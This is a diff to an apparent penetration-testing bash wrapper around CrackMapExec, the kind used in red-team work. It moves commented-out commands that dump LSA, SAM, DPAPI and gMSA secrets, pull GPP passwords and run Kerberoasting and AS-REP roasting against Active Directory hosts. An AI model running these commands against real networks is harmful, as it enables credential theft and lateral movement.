@@ -30,6 +30,9 @@ echo ' '
 
 LOGFILE=$1-lazycme.log
 #this might not be needed, going to leave it until all CME installs are ready
+#could fix with:
+# LOG='--log meep.log'
+# then crackmap blah blah $LOG
 
 #move config file to .bak; put new config with logging
 mv ~/.cme/cme.conf ~/.cme/cme.conf.bak
@@ -461,14 +464,7 @@ echo ' Cleaning up master log file'
 cat $LOGFILE | grep -vi 'esc' > cleaned-$LOGFILE
 ###############################################################################
 
-#put this in after testing
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa --sam --dpapi --gmsa
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --users --pass-pol
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 -M gpp_autologin gpp_password 
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --kerberoast kerberoasts.txt --asreproast asreproasts.txt
 
-
-#if logging works, parse log file for shit
 
 ###############################################################################
 ###############################################################################
@@ -498,6 +494,19 @@ echo 'crackmapexec rdp ips domain user password'
 
 #TODO
 
+
+#put this in after testing
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa --sam --dpapi --gmsa
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --users --pass-pol
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 -M gpp_autologin gpp_password 
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --kerberoast kerberoasts.txt --asreproast asreproasts.txt
+# alias smb='crackmapexec smb $5 -d $4 -u $1 -p $2 ' 
+# alias ldap='crackmapexec ldap $5 -d $4 -u $1 -p $2 ' 
+# then gotta change EVERYTHING sadge
+
+
+
+#if logging works, parse log file for shit
 
 # add hash functionality
 # automate shares for crackmapexe
